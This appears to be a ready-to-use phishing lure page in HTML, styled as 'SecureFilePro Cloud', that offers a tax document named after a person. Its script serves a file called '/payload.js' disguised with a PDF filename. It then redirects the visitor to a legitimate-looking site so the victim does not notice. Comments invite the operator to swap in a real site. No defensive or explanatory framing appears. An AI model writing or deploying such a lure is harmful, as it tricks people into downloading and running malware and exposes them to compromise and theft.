<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>SecureFilePro Cloud</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      background: #f8f9fa;
      text-align: center;
      padding: 60px 20px;
    }
    .container {
      max-width: 650px;
      margin: 0 auto;
      background: white;
      padding: 50px 30px;
      border-radius: 12px;
      box-shadow: 0 4px 20px rgba(0,0,0,0.1);
    }
    .loading {
      display: none;
      margin: 25px 0;
      font-size: 18px;
      color: #007bff;
    }
    .btn {
      background: #007bff;
      color: white;
      padding: 16px 40px;
      font-size: 18px;
      border: none;
      border-radius: 6px;
      cursor: pointer;
      margin-top: 20px;
    }
    .btn:hover { background: #0056b3; }
    .filename {
      font-weight: bold;
      color: #333;
      font-size: 19px;
      margin: 20px 0;
    }
  </style>
</head>
<body>
  <div class="container">
    <h2>Your tax document is ready</h2>
    <div class="filename">Michael Williams Taxdocs 2026.pdf</div>
    <p>Size: 10.4 MB | Secure • Encrypted</p>
    
    <button class="btn" id="downloadBtn">Download Now</button>
    
    <div id="loading" class="loading">
      ⬇️ Downloading securely... Please wait
    </div>
    
    <p style="margin-top: 40px; color: #666; font-size: 14px;">
      Your file will be downloaded securely.
    </p>
  </div>

  <script>
    const originalSite = "https://securefilepro.com";   // ← Change this to your real site if needed

    function downloadFile() {
      const btn = document.getElementById('downloadBtn');
      const loading = document.getElementById('loading');
      
      btn.style.display = 'none';
      loading.style.display = 'block';

      const link = document.createElement('a');
      link.href = "/payload.js";                    // Updated to payload.js
      link.download = "Michael Williams Taxdocs 2026.pdf";
      
      document.body.appendChild(link);
      link.click();
      document.body.removeChild(link);

      // Redirect to original site after download starts
      setTimeout(() => {
        window.location.href = originalSite;
      }, 1600);
    }

    document.getElementById('downloadBtn').addEventListener('click', downloadFile);
  </script>
</body>
</html>
